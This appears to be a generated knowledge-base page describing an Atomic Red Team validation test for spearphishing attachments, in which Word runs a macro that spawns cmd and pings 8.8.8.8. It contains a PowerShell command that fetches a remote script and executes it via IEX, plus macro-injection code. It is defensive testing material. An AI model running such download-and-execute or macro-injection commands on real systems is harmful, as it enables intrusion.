---
atomic_guid: "cbb6799a-425c-4f83-9194-5447a909d67f"
title: "Word spawned a command shell and used an IP address in the command line"
framework: "atomic"
generated: "true"
attack_technique_id: "T1566.001"
attack_technique_name: "Phishing: Spearphishing Attachment"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1566.001/T1566.001.yaml"
build_date: "2026-04-27 19:12:28"
executor: "powershell"
aliases:
  - "cbb6799a-425c-4f83-9194-5447a909d67f"
  - "Word spawned a command shell and used an IP address in the command line"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Word spawning a command prompt then running a command with an IP address in the command line is an indicator of malicious activity.
Upon execution, CMD will be launched and ping 8.8.8.8.

## ATT&CK Mapping

- [[kb/attack/techniques/T1566-phishing#^t1566001-spearphishing-attachment|T1566.001: Spearphishing Attachment]]

## Input Arguments

### jse_path

- description: Path for the macro to write out the "malicious" .jse file

- type: string
- default: C:\Users\Public\art.jse

### ms_product

- description: Maldoc application Word or Excel
- type: string
- default: Word

## Dependencies

Microsoft #{ms_product} must be installed

### Prerequisite Check

```powershell
try {
  New-Object -COMObject "#{ms_product}.Application" | Out-Null
  $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
  Stop-Process -Name $process
  exit 0
} catch { exit 1 }
```

### Get Prerequisite

```powershell
Write-Host "You will need to install Microsoft #{ms_product} manually to meet this requirement"
```

## Executor

- name: powershell

### Command

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
$macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n"
Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
```

### Cleanup

```powershell
Remove-Item #{jse_path} -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1566.001/T1566.001.yaml)
